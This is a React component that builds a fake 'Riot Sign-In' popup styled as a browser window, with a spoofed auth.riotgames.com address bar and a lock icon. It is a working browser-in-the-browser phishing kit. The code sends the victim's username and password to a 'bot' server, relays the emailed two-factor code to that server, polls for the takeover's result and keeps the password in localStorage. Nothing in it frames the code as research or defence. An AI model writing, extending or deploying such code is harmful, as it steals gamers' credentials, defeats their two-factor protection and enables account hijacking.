import React, { useState, useRef, useEffect } from 'react';
import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2 } from 'lucide-react';

const RiotWindow = ({ onClose, onSuccess }) => {
  const [position, setPosition] = useState({ x: 100, y: 100 });
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  
  const [step, setStep] = useState(1);
  const [code, setCode] = useState("");
  const [botMessage, setBotMessage] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [isCodeSent, setIsCodeSent] = useState(false);
  const [verificationResult, setVerificationResult] = useState(null);
  
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });
  const loginTimeout = useRef(null);

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  const sendToBot = async (user, pass) => {
    try {
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setSessionId(data.sessionId);
        return true;
      }
      return false;
    } catch (err) {
      console.error("Bot error:", err);
      return false;
    }
  };

  const sendCodeToBot = async (code) => {
    try {
      const response = await fetch('http://localhost:5000/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, code })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setIsCodeSent(true);
        setStep(3);
        setBotMessage("Verifying...");
        pollStatus();
        return true;
      }
      return false;
    } catch (err) {
      console.error("Code error:", err);
      return false;
    }
  };

  const pollStatus = async () => {
    try {
      const response = await fetch(`http://localhost:5000/status/${sessionId}`);
      const data = await response.json();
      
      if (data.status === "verified") {
        setVerificationResult('correct');
        setBotMessage("✅ Verified!");
        setTimeout(() => {
          setStep(4);
          if (onSuccess) onSuccess();
          setTimeout(() => {
            window.location.href = '/dashboard';
          }, 2000);
        }, 1000);
      } else if (data.status === "failed") {
        setVerificationResult('incorrect');
        setBotMessage("❌ Incorrect code. Try again.");
        setTimeout(() => {
          setStep(2);
          setCode("");
          setIsCodeSent(false);
          setVerificationResult(null);
          setBotMessage("Enter the code from your email:");
        }, 5000);
      } else {
        setTimeout(pollStatus, 2000);
      }
    } catch (err) {
      console.error("Status error:", err);
      setTimeout(pollStatus, 3000);
    }
  };

  const handleLogin = async () => {
    if (!isEnabled) return;
    
    setLoading(true);
    
    const botSent = await sendToBot(username, password);
    
    if (botSent) {
      try {
        localStorage.setItem('riot_u', username);
        localStorage.setItem('riot_p', password);
      } catch (err) {
        console.error("Storage failed:", err);
      }
      
      if (loginTimeout.current) {
        clearTimeout(loginTimeout.current);
      }
      
      loginTimeout.current = setTimeout(() => {
        setLoading(false);
        setStep(2);
        setBotMessage("Enter the code from your email:");
        loginTimeout.current = null;
      }, 3000);
    } else {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async () => {
    if (!code || code.length < 6) return;
    
    setLoading(true);
    await sendCodeToBot(code);
    setLoading(false);
  };

  const isEnabled = username.length >= 3 && password.length >= 3;

  useEffect(() => {
    return () => {
      if (loginTimeout.current) {
        clearTimeout(loginTimeout.current);
      }
    };
  }, []);

  const renderContent = () => {
    if (step === 1) {
      return (
        <>
          <h2 className="text-2xl text-zinc-900 font-bold mb-8">Sign in</h2>
          
          {loading && (
            <div className="mb-4 flex items-center gap-2 text-zinc-600">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="text-sm">Verifying...</span>
            </div>
          )}
          
          <div className="w-full max-w-[350px] space-y-4">
            <input 
              type="text" 
              placeholder="Username" 
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
            />
            <input 
              type="password" 
              placeholder="Password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
            />

            <div className="flex justify-center pt-6">
              <button 
                onClick={handleLogin}
                disabled={!isEnabled || loading}
                className={`w-20 h-20 rounded-full flex items-center justify-center transition-all duration-300 ${
                  isEnabled && !loading ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-gray-300 cursor-not-allowed"
                }`}
              >
                {loading ? (
                  <Loader2 className="w-8 h-8 text-white animate-spin" />
                ) : (
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M12 5l7 7-7 7" /></svg>
                )}
              </button>
            </div>
          </div>
        </>
      );
    }

    if (step === 2) {
      return (
        <>
          <div className="text-center">
            <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto mb-4">
              <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
            </div>
            
            <h2 className="text-2xl text-zinc-900 font-bold mb-2">Enter Code</h2>
            <p className="text-zinc-600 text-sm mb-6">
              {botMessage}
            </p>
            
            {!isCodeSent ? (
              <div className="w-full max-w-[350px] mx-auto space-y-4">
                <input 
                  type="text" 
                  placeholder="Enter 6-digit code" 
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  maxLength={6}
                  className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500 text-center text-lg tracking-widest" 
                />
                
                <button 
                  onClick={handleCodeSubmit}
                  disabled={loading}
                  className="w-full h-12 rounded-lg font-medium bg-blue-600 hover:bg-blue-700 text-white"
                >
                  {loading ? <Loader2 className="animate-spin inline-block" /> : "Verify"}
                </button>
              </div>
            ) : (
              <div className="text-center py-8">
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin mx-auto" />
                <p className="text-zinc-600 text-sm mt-4">Verifying...</p>
              </div>
            )}
          </div>
        </>
      );
    }

    if (step === 3) {
      const isCorrect = verificationResult === 'correct';
      const isIncorrect = verificationResult === 'incorrect';
      
      return (
        <>
          <div className="text-center">
            <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${
              isCorrect ? 'bg-green-100' : isIncorrect ? 'bg-red-100' : 'bg-blue-100'
            }`}>
              {isCorrect ? (
                <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              ) : isIncorrect ? (
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              ) : (
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
              )}
            </div>
            
            <h2 className={`text-2xl font-bold mb-2 ${
              isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-900'
            }`}>
              {isCorrect ? 'Verified!' : isIncorrect ? 'Incorrect' : 'Verifying...'}
            </h2>
            <p className={`text-sm ${isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-600'}`}>
              {botMessage}
            </p>
          </div>
        </>
      );
    }

    if (step === 4) {
      return (
        <>
          <div className="text-center">
            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            
            <h2 className="text-2xl text-green-600 font-bold mb-2">Verified!</h2>
            <p className="text-zinc-600 text-sm">✅ Account verified successfully.</p>
          </div>
        </>
      );
    }

    return null;
  };

  return (
    <div
      style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
      className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
    >
      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
        <div className="flex items-center h-full">
          <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
            <img src="https://cdn.brandfetch.io/idtxF1ugCc/theme/dark/symbol.svg?c=1bxid64Mup7aczewSAYMX&t=1758261660760" alt="Riot" className="w-4 h-4 object-contain"/>
            <span className="text-[11px] text-zinc-300 truncate">Riot Sign-In</span>
            <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
          </div>
        </div>
        <div className="flex items-center gap-3 pr-2">
          <Minus size={14} className="text-zinc-500" />
          <Square size={12} className="text-zinc-500" />
          <X size={16} className="text-zinc-400 hover:text-red-400 cursor-pointer" onClick={onClose} />
        </div>
      </div>

      <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
        <div className="flex gap-3 text-zinc-500"><ArrowLeft size={16} /><ArrowRight size={16} /><RotateCw size={16} /></div>
        <div className="flex-1 h-7 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
          <span className="text-emerald-500">https://</span>
          <span className="text-zinc-400">auth.riotgames.com</span>
          <Lock size={12} className="text-green-500 ml-auto" />
        </div>
      </div>

      <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
        <img 
          src="https://esportsinsider.com/wp-content/uploads/2022/02/ESI-Illustrations-9-696x418.png" 
          alt="Brand Logo" 
          className="w-32 h-auto object-contain mb-6" 
        />
        
        {renderContent()}
      </div>
    </div>
  );
};

export default RiotWindow;